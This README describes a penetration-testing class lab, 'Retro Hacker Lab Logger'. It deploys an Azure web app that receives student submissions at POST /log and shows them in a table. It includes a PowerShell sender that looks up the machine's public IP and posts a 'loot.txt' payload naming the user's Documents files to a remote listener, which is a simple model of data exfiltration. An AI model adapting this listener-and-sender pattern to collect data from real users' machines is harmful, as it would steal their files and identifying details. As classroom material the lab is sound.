# Retro Hacker Lab Logger

This project deploys a lightweight Azure Web App that accepts student telemetry submissions and renders them in a retro hacker-themed table with timestamps.

## Required POST payload

The app will reject any request that does not include all of the following fields:

- student_id
- hacker_handle
- filename
- public_ip
- data

The listener endpoint is:

- POST /log

Example payload:

```json
{
  "student_id": "STU-001",
  "hacker_handle": "neo",
  "filename": "loot.txt",
  "public_ip": "203.0.113.15",
  "data": "C:\\Users\\student\\Documents\\*.txt"
}
```

## Azure deployment

Use this link to deploy the app to Azure:

https://portal.azure.com/#create/Microsoft.Template/uri/https%3A%2F%2Fraw.githubusercontent.com%2Fgrownuphacker%2FPen-Testing-Class%2Fmain%2Fazuredeploy.json

## Local development

```bash
npm install
npm start
```

Then POST to:

```text
http://localhost:3000/log
```

## Student-friendly sender example

Use the provided [test-listener.ps1](test-listener.ps1) as a template. Replace the URL with your Azure site, then send the required payload.

If you want a cleaner reusable version for class use, create or edit your own script and include the required keys:

```powershell
$serviceUrl = "https://<your-student-lab>.azurewebsites.net/log"
$publicIp = (Invoke-RestMethod -Uri "https://api.ipify.org").Trim()

$payload = @{
    student_id = "STU-001"
    hacker_handle = "neo"
    filename = "loot.txt"
    public_ip = $publicIp
    data = "C:\Users\$env:USERNAME\Documents\*.txt"
}

Invoke-RestMethod -Uri $serviceUrl -Method POST -Body ($payload | ConvertTo-Json -Compress) -ContentType "application/json"
```

## Validation

```bash
npm test
```

